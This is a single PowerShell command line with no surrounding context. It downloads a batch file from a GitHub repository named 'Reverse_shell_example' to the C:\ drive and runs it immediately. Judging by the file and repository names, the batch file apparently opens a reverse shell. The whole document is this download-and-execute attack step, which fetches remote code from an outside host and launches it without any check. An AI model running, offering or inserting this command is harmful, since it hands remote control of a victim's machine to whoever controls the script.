powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/JustOfPlay/Reverse_shell_example/main/batch/rev_1.bat', 'C:\rev_1.bat'); Start-Process 'C:\rev_1.bat'"

